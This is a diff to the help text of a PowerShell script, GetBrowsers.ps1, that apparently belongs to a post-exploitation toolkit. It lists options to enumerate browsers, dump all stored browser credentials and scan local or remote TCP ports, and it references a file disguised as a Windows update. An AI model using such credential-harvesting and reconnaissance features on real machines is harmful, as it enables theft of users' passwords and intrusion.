@@ -24,31 +24,32 @@
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1
-   Display List of arguments available
+   Display a list of all arguments available
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1 -RECON
-   Fast Recon (Browsers and Versions Only)
+   Fast Recon (browsers, versions and interfaces)
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1 -FIREFOX
-   Enumerates FireFox Browser information Only.
+   Enumerates FireFox browser information Only.
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1 -ALL
-   Enumerates Internet Explorer (IE|MsEdge), FireFox and Chrome Browsers information.
+   Enumerates IE (iexplore|msedge), FireFox and Chrome browsers information.
    
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1 -CHROME $env:USERPROFILE\Desktop
-   Enumerates Chrome browser and saves logfile to: $env:USERPROFILE\Desktop\BrowserEnum.log
+   Enumerates Chrome browser and stores logfile to: $env:USERPROFILE\Desktop\BrowserEnum.log
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1 -ADDONS $env:USERPROFILE\Desktop
-   Enumerates ALL Browsers addons and saves logfile to: $env:USERPROFILE\Desktop\BrowserEnum.log
+   Enumerates ALL browsers addons and stores logfile to: $env:USERPROFILE\Desktop\BrowserEnum.log
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1 -SCAN 80,135,139,445
-   Enumerates local host open|closed tcp ports (does not store the logfile)
+   Enumerates local|remote host open|closed tcp ports 
+   'This Function does not allow the permanent storage of the logfile'
 
 .INPUTS
    None. You cannot pipe objects to GetBrowsers.ps1
@@ -94,7 +95,7 @@ If(-not($param1)){
     echo "./GetBrowsers.ps1 -CREDS            Enumerates ALL browsers credentials stored.`n" >> $LogFilePath\BrowserEnum.log
     echo "The following Optional args are available:" >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -IE `$env:TMP      Enumerates selected browser and stores logfile to 'tmp'." >> $LogFilePath\BrowserEnum.log
-    echo "./GetBrowsers.ps1 -SCAN 135,139,445 Enumerates Local host open|closed tcp ports.`n" >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -SCAN 135,139,445 Enumerates local|remote host open|closed tcp ports." >> $LogFilePath\BrowserEnum.log
     Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
         ## For those who insiste in running this script outside meterpeter
         If(-not(Test-Path "$env:tmp\Update-KB4524147.ps1")){
